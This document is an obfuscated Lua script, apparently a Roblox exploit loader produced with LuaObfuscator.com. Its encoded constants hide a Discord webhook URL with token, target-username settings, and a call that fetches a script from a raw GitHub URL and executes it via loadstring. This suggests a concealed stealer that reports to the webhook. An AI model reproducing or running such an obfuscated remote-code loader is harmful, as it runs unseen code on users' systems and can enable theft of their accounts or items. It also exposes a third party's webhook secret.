--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.9.14) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v82=v2(v0(v30,16));if v19 then local v88=v5(v82,v19);v19=nil;return v88;else return v82;end end end);local function v20(v31,v32,v33)if v33 then local v83=(v31/((5 -3)^(v32-(2 -1))))%((3 -1)^(((v33-1) -(v32-(2 -1))) + (620 -(555 + 64)))) ;return v83-(v83%(932 -(857 + 74))) ;else local v84=2^(v32-1) ;return (((v31%(v84 + v84))>=v84) and ((143 + 426) -(58 + 309 + 201))) or (927 -(214 + 713)) ;end end local function v21()local v34=0;local v35;while true do if (v34==((1251 -373) -(282 + 595))) then return v35;end if (v34==(1637 -(1523 + 114))) then v35=v1(v16,v18,v18);v18=v18 + 1 + 0 ;v34=1;end end end local function v22()local v36=1065 -(68 + 997) ;local v37;local v38;while true do if (v36==(1271 -(226 + 1044))) then return (v38 * ((248 + 866) -858)) + v37 ;end if (v36==0) then v37,v38=v1(v16,v18,v18 + (119 -(32 + 85)) );v18=v18 + 2 ;v36=1 + 0 ;end end end local function v23()local v39,v40,v41,v42=v1(v16,v18,v18 + (960 -(892 + 65)) );v18=v18 + (9 -5) ;return (v42 * ((31011792 -(67 + 113)) -14234396)) + (v41 * (120312 -54776)) + (v40 * (606 -(87 + 263))) + v39 ;end local function v24()local v43=0 + 0 ;local v44;local v45;local v46;local v47;local v48;local v49;while true do if (v43==(7 -4)) then if (v48==(0 + 0)) then if (v47==(0 -0)) then return v49 * (952 -(802 + 150)) ;else local v99=0;while true do if (v99==((0 -0) -0)) then v48=1 -0 ;v46=0 + 0 ;break;end end end elseif (v48==(3044 -(915 + 82))) then return ((v47==(0 -(438 -(145 + 293)))) and (v49 * (1/(0 + (430 -(44 + 386)))))) or (v49 * NaN) ;end return v8(v49,v48-(1344 -(1807 -(998 + 488))) ) * (v46 + (v47/(((378 + 811) -(1069 + 118))^(117 -(54 + 11))))) ;end if (v43==2) then v48=v20(v45,(817 -(201 + 571)) -24 ,6 + 25 );v49=((v20(v45,56 -24 )==(1 + 0)) and  -1) or 1 ;v43=3;end if (v43==(792 -(368 + 423))) then v46=3 -2 ;v47=(v20(v45,1,38 -(10 + 8) ) * ((7 -5)^(474 -(416 + (1164 -(116 + 1022)))))) + v44 ;v43=2;end if (v43==(0 -(0 -0))) then v44=v23();v45=v23();v43=1 + 0 ;end end end local function v25(v50)local v51=0;local v52;local v53;while true do if (v51==(2 + 0)) then v53={};for v89=1, #v52 do v53[v89]=v2(v1(v3(v52,v89,v89)));end v51=10 -7 ;end if ((10 -7)==v51) then return v6(v53);end if (v51==(860 -(814 + 45))) then v52=v3(v16,v18,(v18 + v50) -(2 -1) );v18=v18 + v50 ;v51=(1081 -(1020 + 60)) + 1 ;end if (v51==(0 + 0)) then v52=nil;if  not v50 then v50=v23();if (v50==(0 -0)) then return "";end end v51=886 -(261 + 624) ;end end end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v54=0;local v55;local v56;local v57;local v58;local v59;local v60;local v61;while true do if (v54~=1) then else v57=nil;v58=nil;v54=2;end if (v54~=3) then else v61=nil;while true do local v91=0;local v92;while true do if (v91==(0 -0)) then v92=0 + 0 ;while true do if (0==v92) then if (v55~=0) then else local v100=0;local v101;while true do if (v100==(0 -0)) then v101=0 -0 ;while true do if (v101==(867 -(550 + 317))) then v56={};v57={};v101=1;end if (v101==2) then v55=1;break;end if (v101==(1 -0)) then v58={};v59={v56,v57,nil,v58};v101=287 -(134 + 151) ;end end break;end end end if (v55==(1666 -(970 + 695))) then local v102=0 -0 ;while true do if (v102==(1990 -(582 + 1408))) then local v114=0;while true do if (v114==(3 -2)) then v102=1 -0 ;break;end if (v114==(0 -0)) then v60=v23();v61={};v114=1;end end end if (v102~=1) then else for v150=1,v60 do local v151=0;local v152;local v153;while true do if (0==v151) then v152=v21();v153=nil;v151=1825 -(1195 + 629) ;end if (v151==1) then if (v152==(1 -0)) then v153=v21()~=0 ;elseif (v152==(243 -(187 + 54))) then v153=v24();elseif (v152~=3) then else v153=v25();end v61[v150]=v153;break;end end end v59[3]=v21();v102=2;end if (2==v102) then v55=2;break;end end end v92=1;end if ((781 -(162 + 618))==v92) then if ((2 + 0)~=v55) then else local v103=0 + 0 ;while true do local v104=0 -0 ;while true do if (v104==0) then if (0==v103) then for v165=1,v23() do local v166=0;local v167;local v168;while true do if (v166==(1 -0)) then while true do if (v167==(0 + 0)) then v168=v21();if (v20(v168,1,1637 -(1373 + 263) )~=0) then else local v175=0;local v176;local v177;local v178;local v179;local v180;while true do if (1~=v175) then else v178=nil;v179=nil;v175=1002 -(451 + 549) ;end if (v175==(0 + 0)) then v176=0;v177=nil;v175=1 -0 ;end if (2~=v175) then else v180=nil;while true do if (v176==2) then while true do if (v177~=0) then else local v183=0 -0 ;while true do if (v183==(1385 -(746 + 638))) then v177=1;break;end if (v183==0) then v178=v20(v168,2,3);v179=v20(v168,2 + 2 ,6);v183=1;end end end if (v177==(4 -1)) then if (v20(v179,344 -(218 + 123) ,1584 -(1535 + 46) )==(1 + 0)) then v180[1 + 3 ]=v61[v180[564 -(306 + 254) ]];end v56[v165]=v180;break;end if (v177==(1 + 1)) then local v185=0 -0 ;while true do if (v185==0) then if (v20(v179,1,1468 -(899 + 568) )==(1 + 0)) then v180[4 -2 ]=v61[v180[605 -(268 + 335) ]];end if (v20(v179,292 -(60 + 230) ,574 -(426 + 146) )==1) then v180[3]=v61[v180[1 + 2 ]];end v185=1457 -(282 + 1174) ;end if (1==v185) then v177=814 -(569 + 242) ;break;end end end if (v177==(2 -1)) then local v186=0 + 0 ;while true do if (v186~=1) then else v177=1026 -(706 + 318) ;break;end if (v186~=0) then else v180={v22(),v22(),nil,nil};if (v178==0) then local v193=0;local v194;local v195;local v196;while true do if (v193==(0 + 0)) then v194=700 -(271 + 429) ;v195=nil;v193=1;end if (v193==(1 + 0)) then v196=nil;while true do if (v194==(1501 -(1408 + 92))) then while true do if (v195==(1086 -(461 + 625))) then v196=1288 -(993 + 295) ;while true do if (v196~=(0 + 0)) then else v180[1174 -(418 + 753) ]=v22();v180[2 + 2 ]=v22();break;end end break;end end break;end if (v194~=(0 + 0)) then else v195=0;v196=nil;v194=1 + 0 ;end end break;end end elseif (v178==(1 + 0)) then v180[532 -(406 + 123) ]=v23();elseif (v178==(1771 -(1749 + 20))) then v180[1 + 2 ]=v23() -(2^16) ;elseif (v178==(1325 -(1249 + 73))) then local v199=0;local v200;local v201;while true do if (v199==0) then v200=0;v201=nil;v199=1 + 0 ;end if (v199==(1146 -(466 + 679))) then while true do if (v200~=(0 -0)) then else v201=0 -0 ;while true do if ((1900 -(106 + 1794))==v201) then v180[1 + 2 ]=v23() -(2^16) ;v180[2 + 2 ]=v22();break;end end break;end end break;end end end v186=2 -1 ;end end end end break;end if (v176==1) then local v181=0;while true do if (v181~=(2 -1)) then else v176=116 -(4 + 110) ;break;end if (v181==(584 -(57 + 527))) then v179=nil;v180=nil;v181=1;end end end if (v176~=(1427 -(41 + 1386))) then else local v182=0;while true do if ((104 -(17 + 86))~=v182) then else v176=1 + 0 ;break;end if (v182==(0 -0)) then v177=0 -0 ;v178=nil;v182=167 -(122 + 44) ;end end end end break;end end end break;end end break;end if (0~=v166) then else v167=0 -0 ;v168=nil;v166=1;end end end for v169=1,v23() do v57[v169-1 ]=v28();end v103=3 -2 ;end if (v103~=1) then else return v59;end break;end end end end break;end end break;end end end break;end if (v54==(2 + 0)) then v59=nil;v60=nil;v54=3;end if ((0 + 0)==v54) then local v87=0 -0 ;while true do if (v87==1) then v54=1;break;end if (v87==0) then v55=65 -(30 + 35) ;v56=nil;v87=1;end end end end end local function v29(v62,v63,v64)local v65=v62[1];local v66=v62[2];local v67=v62[3];return function(...)local v68=v65;local v69=v66;local v70=v67;local v71=v27;local v72=1;local v73= -1;local v74={};local v75={...};local v76=v12("#",...) -1 ;local v77={};local v78={};for v85=0,v76 do if (v85>=v70) then v74[v85-v70 ]=v75[v85 + 1 ];else v78[v85]=v75[v85 + 1 ];end end local v79=(v76-v70) + 1 ;local v80;local v81;while true do local v86=0;while true do if (v86==1) then if (v81<=12) then if (v81<=5) then if (v81<=2) then if (v81<=0) then do return;end elseif (v81==1) then v78[v80[2]]=v80[3];else for v154=v80[2],v80[3] do v78[v154]=nil;end end elseif (v81<=3) then v78[v80[2]]=v64[v80[3]];elseif (v81==4) then v78[v80[2]]();else v78[v80[2]][v80[3]]=v80[4];end elseif (v81<=8) then if (v81<=6) then local v107=v80[2];local v108=v78[v80[3]];v78[v107 + 1 ]=v108;v78[v107]=v108[v80[4]];elseif (v81>7) then v72=v80[3];else v64[v80[3]]=v78[v80[2]];end elseif (v81<=10) then if (v81==9) then if (v78[v80[2]]==v80[4]) then v72=v72 + 1 ;else v72=v80[3];end else local v123=v80[2];local v124,v125=v71(v78[v123](v13(v78,v123 + 1 ,v80[3])));v73=(v125 + v123) -1 ;local v126=0;for v156=v123,v73 do v126=v126 + 1 ;v78[v156]=v124[v126];end end elseif (v81==11) then do return;end else local v127=v80[2];local v128=v78[v80[3]];v78[v127 + 1 ]=v128;v78[v127]=v128[v80[4]];end elseif (v81<=18) then if (v81<=15) then if (v81<=13) then v78[v80[2]]();elseif (v81>14) then if (v78[v80[2]]==v80[4]) then v72=v72 + 1 ;else v72=v80[3];end else v64[v80[3]]=v78[v80[2]];end elseif (v81<=16) then v78[v80[2]]=v80[3]~=0 ;elseif (v81==17) then local v134=v80[2];v78[v134]=v78[v134](v13(v78,v134 + 1 ,v73));else for v159=v80[2],v80[3] do v78[v159]=nil;end end elseif (v81<=21) then if (v81<=19) then v72=v80[3];elseif (v81>20) then local v136=v80[2];v78[v136]=v78[v136](v13(v78,v136 + 1 ,v73));else v78[v80[2]]=v80[3]~=0 ;end elseif (v81<=23) then if (v81==22) then v78[v80[2]]=v64[v80[3]];else v78[v80[2]][v80[3]]=v80[4];end elseif (v81>24) then local v143=0;local v144;local v145;local v146;local v147;while true do if (v143==1) then v73=(v146 + v144) -1 ;v147=0;v143=2;end if (v143==0) then v144=v80[2];v145,v146=v71(v78[v144](v13(v78,v144 + 1 ,v80[3])));v143=1;end if (v143==2) then for v171=v144,v73 do local v172=0;while true do if (v172==0) then v147=v147 + 1 ;v78[v171]=v145[v147];break;end end end break;end end else v78[v80[2]]=v80[3];end v72=v72 + 1 ;break;end if (0==v86) then v80=v68[v72];v81=v80[1];v86=1;end end end end;end return v29(v28(),{},v17)(...);end v15("LOL!123O00028O00027O0040026O00F03F026O00084003023O005F4703093O00416E74694C656176652O0103093O004D6F7573654C6F636B03083O00557365724E616D6503093O004C6772696E64696E6703073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O31333634352O37352O3733343734383235302F36467341534E56322D796A5744744C777033676E2O682D6A422O7359694B58516D455530682D6F4371774263706268344744324168796A5879594132544E6D6A5161312D030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403463O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4C7970686572582F4D6F7269536372697074732F6D61696E2F4D6F72695363726970745A03093O00557365724E616D6532030D3O004C6F6164696E675363722O656E00393O0012183O00014O0012000100013O0026093O0002000100010004133O00020001001218000100013O00260900010014000100020004133O00140001001218000200013O0026090002000C000100030004133O000C0001001218000100043O0004133O0014000100260900020008000100010004133O00080001001203000300053O003005000300060007001203000300053O003005000300080007001218000200033O0004133O0008000100260900010023000100010004133O00230001001218000200013O0026090002001E000100010004133O001E00010012180003000A3O001207000300093O0012180003000C3O0012070003000B3O001218000200033O00260900020017000100030004133O00170001001218000100033O0004133O002300010004133O001700010026090001002E000100040004133O002E00010012030002000D3O0012030003000E3O00200C00030003000F001218000500104O0010000600014O0019000300064O001500023O00022O00040002000100010004133O0038000100260900010005000100030004133O000500010012180002000A3O001207000200113O001203000200053O003005000200120007001218000100023O0004133O000500010004133O003800010004133O000200012O000B3O00017O00",v9(),...);